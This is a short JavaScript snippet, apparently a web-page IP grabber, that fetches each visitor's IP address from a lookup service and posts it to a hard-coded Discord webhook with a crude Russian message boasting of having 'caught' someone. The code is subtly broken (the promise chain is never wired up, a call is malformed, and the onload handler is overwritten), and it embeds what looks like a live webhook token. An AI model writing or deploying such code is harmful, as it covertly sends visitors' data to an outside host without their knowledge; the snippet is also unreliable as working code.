var ip = '';
fetch("https://api.ipify.org/?format=json");
function x(response) {
  return response.json();
}

function y(data) {
  ip = data.ip;
  var webhook = "https://discord.com/api/webhooks/1126295689748553841/xQ_9FQHol7Uj9afyn54a_W1NfCykITR-7lPyPhY1xINoZ84x-5_Ht83U3e2JM9vFoPgj";
  var message = {
    content: "Поймали кого то за яйца.\nЕго айпи " + ip
  };
  fetch(webhook, {
    method: 'POST',
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(message)
  };
};

window.onload = y;
window.onload = x;
